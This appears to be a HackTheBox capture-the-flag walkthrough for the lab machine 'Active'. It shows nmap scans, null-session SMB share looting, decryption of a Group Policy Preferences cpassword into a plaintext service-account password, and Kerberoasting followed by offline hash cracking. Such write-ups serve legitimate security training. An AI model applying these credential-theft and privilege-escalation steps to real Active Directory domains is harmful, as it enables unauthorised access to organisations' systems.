---
title: "[HacktTheBox] walkthrough: Active (Active Directory)"
date: 2025-11-15
categories: [hackthebox]
tags: [htb, Windows, AD]
---

![](/assets/images/hackthebox/active/스크린샷%202025-10-05%20오전%201.01.44.png)

## Info

- Platform: Hackthebox
- Machine Name: Active
- Target IP/Host: 10.10.10.100
- OS / Version: Windows (AD)
- Difficulty / Category: Easy

## Overview

This machine is an easy Active Directory machine that involves exploiting SMB null sessions, GPP vulnerability, and Kerberoasting.

## Recon & Enummeration

First, I performed a fast SYN scan using nmap with the `--min-rate 3000` flag.  
This revealed common Active Directory ports like LDAP and Kerberos, suggesting the target is an Active Directory machine.

```
┌──(kali㉿kali)-[~/htb/Active/recon]
└─$ sudo nmap 10.10.10.100 -n --min-rate 3000 -oN synscan                                                               
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 23:41 KST
Nmap scan report for 10.10.10.100
Host is up (0.20s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
```

Next, I performed a detail scan using the `-sCV` flags.  
I got the domain name as active.htb, and added it to /etc/hosts file.

```
echo '10.10.10.100 active.htb' | sudo tee -a /etc/hosts
```

I checked for an SMB null session using `nxc` (NetExec).  
The result indicated that the null sesison had read permissions on the `Replication` share.

```
┌──(kali㉿kali)-[~/htb/Active/recon]
└─$ nxc smb 10.10.10.100 -u "" -p "" --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users                           
```

## Initial Access

I accessed the `Replication` share using the null session and downloaded all files using `mget`.

```
┌──(kali㉿kali)-[~/htb/Active/recon]
└─$ smbclient -U "" -N //10.10.10.100/Replication       
Try "help" to get a list of possible commands.
smb: \> prompt
smb: \> recurse on
smb: \> mget *
```

Within the `{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups` folder, I discovered a file containing the GPP-encrypted password for the `SVC_TGS` user.

```
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]                                                                      
└─$ cat Groups.xml                                                                                                                                           
<?xml version="1.0" encoding="utf-8"?>                                                                                                                       
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018
-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ8
3mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"
/></User>                                                                                                                                                    
</Groups>    
```

>GPP는 Group Policy Preferences의 약자로, 마이크로소프트의 Active Directory (AD) 환경에서 관리자가 도메인에 연결된 사용자나 컴퓨터의 다양한 설정을 중앙 집중식으로 관리하고 배포할 수 있도록 설계된 기능이다.  
하지만 서비스 계정의 비밀번호를 XML 파일에 암호화 된 형태로 관리하고 모든 시스템에서 동일한 암호화 키가 외부에 노출된 적이 있기 때문에 쉽게 복호화가 가능한 취약점이 있다.

I successfully decrypted that password using the `gpp-decryption` tool, and got plain password: `GPPstillStandingStrong2k18`.

```
┌──(kali㉿kali)-[~/htb/Active/recon]                                  
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                                       
GPPstillStandingStrong2k18
```

Using this credential, I was able to access the `User` share and discovered `user.txt` within the Desktop folder.

## Privilege Escalation

Furthemore, I utilized the acquired credential to perform Kerberoasting, successfully obtaining an Administrator's TGS ticket.

```
┌──(kali㉿kali)-[~/htb/Active/exploit]
└─$ nxc ldap 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting output.txt
```
![](/assets/images/hackthebox/active/스크린샷%202025-10-05%20오전%201.04.44.png)

I then cracked the TGS ticket hash using `John the Ripper` and the wordlist `rockyou.txt`.  

![](/assets/images/hackthebox/active/스크린샷%202025-10-05%20오전%201.05.27.png)

Finally, I obtained the Administrator's plaintext password and used it to retrieve `root.txt` from the Administrator's Desktop folder.